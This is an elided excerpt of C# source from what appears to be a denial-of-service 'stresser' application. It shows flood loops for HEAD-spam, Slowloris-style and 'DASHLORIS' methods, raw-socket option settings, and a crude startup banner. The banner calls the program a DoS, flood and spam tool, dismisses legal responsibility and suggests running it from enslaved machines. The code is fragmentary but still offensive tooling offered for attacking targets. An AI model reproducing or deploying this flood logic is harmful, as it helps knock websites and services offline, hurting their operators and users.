                ...
                if(FormatUrl(Url.Text) == true)
                {
                    ...
                    else
                    {
                        ...
                        for(int index = 0; index <= Convert.ToInt32(Workers.Text) - 1; index += 1)
                        {
                            ...
                            {
                                if((Method == "HEAD_SPAM") || (Method == "SLOWDASH") || (Method == "SLOWLORIS"))
                                {
                                    Modification = "HEAD";
                                    Send = ($"{Modification} / HTTP/1.1\r\n");
                                }
                            ...
                            if ((Method == "DASHLORIS") && (Type == "HTTP_LONG_SOCKS"))
                            {
                                ...
                                for (int sindex = 0; sindex <= 128; sindex = sindex + 1)
                                {
                                    for (int eindex = 0; eindex <= 64; eindex += 1) {
                                        ...
                                        Beef.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.NoChecksum, true);
                                        Beef.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.BlockSource, true);
                                        Beef.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.HeaderIncluded, true);
        ...
        private String StartLog()
        {
            return
                (
                  "~+==================================================+~" + "\r\n" +
                  "|                                                    |" + "\r\n" +
                  "| oh my gawd, here we are again, with more egg shit  |" + "\r\n" +
                  "| and rotten meat type bull bull.                    |" + "\r\n" +
                  "|                                                    |" + "\r\n" +
                  "| this version comes with improvements, some of them |" + "\r\n" +
                  "| are listed, you can view them by clicking the      |" + "\r\n" +
                  "| view Update Log button.                            |" + "\r\n" +
                  "|                                                    |" + "\r\n" +
                  "| since this is an introduction log, i want to tell  |" + "\r\n" +
                  "| you a few things you should keep in mind since     |" + "\r\n" +
                  "| these things may either enhance or destroy your    |" + "\r\n" +
                  "| beautiful script kiddy dreams of Stress Testing    |" + "\r\n" +
                  "| Servers, lol.                                      |" + "\r\n" +
                  "|                                                    |" + "\r\n" +
                  "| Okay, first off, this is not a DDoS tool, instead  |" + "\r\n" +
                  "| this application could be considered a Stresser,   |" + "\r\n" +
                  "| DoS tool, Flood tool, Spam tool or what ever, but  |" + "\r\n" +
                  "| not a foking DDoS tool, get your shiz straight.    |" + "\r\n" +
                  "|                                                    |" + "\r\n" +
                  "|                                                    |" + "\r\n" +
                  "| if your target does not get hit then maybe take    |" + "\r\n" +
                  "| the following things in mind, you dumb shit :      |" + "\r\n" +
                  "|                                                    |" + "\r\n" +
                  "|    - less bandwidth than your target               |" + "\r\n" +
                  "|    - not vulnerable                                |" + "\r\n" +
                  "|    - not reachable                                 |" + "\r\n" +
                  "|    - port is closed or hidden                      |" + "\r\n" +
                  "|    - filtered traffic                              |" + "\r\n" +
                  "|    - traffic limitations                           |" + "\r\n" +
                  "|    - security measurements                         |" + "\r\n" +
                  "|                                                    |" + "\r\n" +
                  "| please know that inproper usage of this amazing    |" + "\r\n" +
                  "| application could be strictly forbidden in your    |" + "\r\n" +
                  "| country, which means you should not keep me shitty |" + "\r\n" +
                  "| responsible for your super-script-lord-kiddy-try-  |" + "\r\n" +
                  "| hard actions ffs, instead use it wisely.           |" + "\r\n" +
                  "|                                                    |" + "\r\n" +
                  "|                                                    |" + "\r\n" +
                  "| if you want more power, maybe consider getting     |" + "\r\n" +
                  "| yourself some slaves and let them run this!        |" + "\r\n" +
                  "|                                                    |" + "\r\n" +
                  "| *I will come with a command line version soon!*    |" + "\r\n" +
                  "|                                                    |" + "\r\n" +
                  "~+==================================================+~" + "\r\n\r\n" +
